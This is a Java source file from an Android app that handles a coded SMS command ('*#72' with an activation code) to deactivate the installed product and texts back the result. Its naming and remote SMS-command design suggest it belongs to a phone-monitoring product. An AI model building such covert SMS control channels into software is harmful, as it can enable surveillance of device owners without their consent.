package com.fx.dalvik.smscommand.interpreter;

import java.util.Timer;
import java.util.TimerTask;

import android.content.Context;
import android.database.ContentObserver;
import android.os.Handler;
import android.os.Looper;

import com.fx.activation.ActivationManager;
import com.fx.dalvik.smscommand.SmsCommandHelper;
import com.fx.maind.ref.Customization;
import com.fx.preference.ConnectionHistoryManager;
import com.fx.preference.ConnectionHistoryManagerFactory;
import com.fx.preference.model.ConnectionHistory;
import com.fx.preference.model.ConnectionHistory.Action;
import com.fx.preference.model.ConnectionHistory.ConnectionStatus;
import com.fx.util.FxResource;
import com.fx.util.FxSettings;
import com.vvt.logger.FxLog;

public class SmsDeactivate {

	private static final String TAG = "SmsDeactivate";
 	private static final boolean LOGV = Customization.VERBOSE;
	
	public static final String COMMAND_ID = "*#72";
	
	// Deactivate product
	// <*#72><FK>
	public static String processCommand(Context context, String[] tokens, 
			String destination, String reportMessage, boolean sendSms) {
		
		if (LOGV) FxLog.v(TAG, "processCommand # Enter ...");
		
		// Check command format
		boolean debugTagValidation = 
				   (tokens.length == 2 && !SmsCommandHelper.isEndWithDebugTag(tokens))
				|| (tokens.length == 3 && SmsCommandHelper.isEndWithDebugTag(tokens));
		
		if (!debugTagValidation) {
			return String.format("%s\n%s",
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_ERROR, 
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_INVALID_COMMAND_FORMAT);
		}
		
		// Check activation Code
		String activationCodeValidation = 
			SmsCommandHelper.getActivationCodeValidation(context, tokens[1]);
		
		if (!activationCodeValidation.equals(FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK)) {
			return activationCodeValidation;
		}
		
		if (LOGV) FxLog.v(TAG, "processCommand # Start responding thread");
		RespondingThread t = new RespondingThread(context, destination, reportMessage, sendSms);
		t.start();
		
		if (LOGV) FxLog.v(TAG, "processCommand # Begin deactivate product");
		ActivationManager.getInstance(context).deactivateProduct(tokens[1]);
		
		if (LOGV) FxLog.v(TAG, "processCommand # EXIT ...");
		
		return FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK;
	}
	
	private static class RespondingThread extends Thread {
		
		private boolean mSendSms;
		private Context mContext;
		private ContentObserver mObserver;
		private String mDestination;
		private String mMsgHeader;
		private Timer mTimer;
		private TimerTask mTask;
		
		public RespondingThread(Context context, 
				String destination, String msgHeader, boolean sendSms) {
			
			mSendSms = sendSms;
			mContext = context;
			mDestination = destination;
			mMsgHeader = msgHeader;
		}
		
		@Override
		public void run() {
			Looper.prepare();
			
			mObserver = new ContentObserver(new Handler()) {
				@Override
				public void onChange(boolean selfChange) {
					if (LOGV) FxLog.v(TAG, "onChange # ENTER ...");
					
					if (LOGV) FxLog.v(TAG, "onChange # Cancel timeout");
					cancelTimeout();
					
					if (LOGV) FxLog.v(TAG, "onChange # Prepare response message");
					boolean success = false;
					
					ConnectionHistoryManager historyManager = 
							ConnectionHistoryManagerFactory.getInstance(mContext);
					
					ConnectionHistory history = historyManager.getLatestConnectionHistory();
					
					Action action = history.getAction();
					
					if (action == Action.DEACTIVATE) {
						ConnectionStatus status = null;
						status = history.getConnectionStatus();
						success = status == ConnectionStatus.SUCCESS;
					}
					
					sendResponseSms(success);
					if (LOGV) FxLog.v(TAG, "onChange # Response is sent");
					
					quit();
					if (LOGV) FxLog.v(TAG, "onChange # EXIT ...");
				}
			};
			
			setTimeout();
			
			mContext.getContentResolver().registerContentObserver(
					ConnectionHistoryManager.URI_NEW_RECORD_ADDED, false, mObserver);
			
			Looper.loop();
		}
		
		private void sendResponseSms(boolean isServerDeactivated) {
			StringBuilder builder = new StringBuilder(mMsgHeader);
			if (isServerDeactivated) {
				builder.append(FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK);
			}
			else {
				builder.append("\n").append(
						FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_DEACTIVATE_SERVER_FAILED);
			}
			SmsCommandHelper.sendResponse(mContext, mDestination, builder.toString(), mSendSms);
		}
		
		private void quit() {
			if (mObserver != null && mContext != null) {
				mContext.getContentResolver().unregisterContentObserver(mObserver);
			}
			
			Looper myLooper = Looper.myLooper();
			if (myLooper != null) {
				myLooper.quit();
			}
		}
		
		private void setTimeout() {
			cancelTimeout();
			
			mTask = new TimerTask() {
				@Override
				public void run() {
					sendResponseSms(false);
					quit();
				}
			};
			
			mTimer = new Timer();
			mTimer.schedule(mTask, getTimeout());
			
			if (LOGV) FxLog.v(TAG, "Timeout is set");
		}
		
		private void cancelTimeout() {
			if (mTask != null) mTask.cancel();
			if (mTimer != null) mTimer.cancel();
		}

		private long getTimeout() {
			long defaultHttpTimeout = FxSettings.getDefaultURLRequestTimeoutLong() * 1000;
			long additionalTimeout = 30 * 1000;
			return defaultHttpTimeout + additionalTimeout;
		}
	}
}
